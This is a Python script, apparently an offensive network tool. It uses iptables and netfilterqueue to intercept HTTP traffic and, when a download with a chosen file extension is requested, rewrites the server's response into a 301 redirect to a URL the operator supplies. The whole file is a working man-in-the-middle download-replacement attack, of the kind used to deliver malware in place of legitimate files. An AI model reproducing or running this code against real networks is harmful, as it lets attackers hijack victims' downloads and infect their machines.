import netfilterqueue,subprocess
from scapy.all import *

ack_list=[]


def process_packet(packet):
    try:
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw):
            if scapy_packet.haslayer(TCP):
                if scapy_packet[TCP].dport == 80:
                    if extension in scapy_packet[Raw].load.decode("utf-8") and url not in scapy_packet[Raw].load.decode("utf-8"):
                        print('[+] File request Detected')
                        ack_list.append(scapy_packet[TCP].ack)
                elif scapy_packet[TCP].sport == 80:
                    if scapy_packet[TCP].seq in ack_list:
                        ack_list.remove(scapy_packet[TCP].seq)
                        print('[+] Injecting file')
                        load = "HTTP/1.1 301 Moved Permanently\n"+"Location: " + url + "\n\n"
                        scapy_packet.load = load.encode()
                        del scapy_packet[IP].chksum
                        del scapy_packet[IP].len
                        del scapy_packet[TCP].chksum
                        packet.set_payload(bytes(scapy_packet))
    except UnicodeDecodeError:
        pass

    packet.accept()



def main():
    global extension, url
    #subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0',shell=True)
    #subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000' , shell=True) 
    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1',shell=True)
    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1',shell=True)

    extension = str(input("Type file extension to intercept: "))
    url = str(input("Type url: "))
    print('[+] iptables configured')
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,process_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        subprocess.call('iptables --flush',shell=True)
        print('\n[+] iptables flushed.')


main()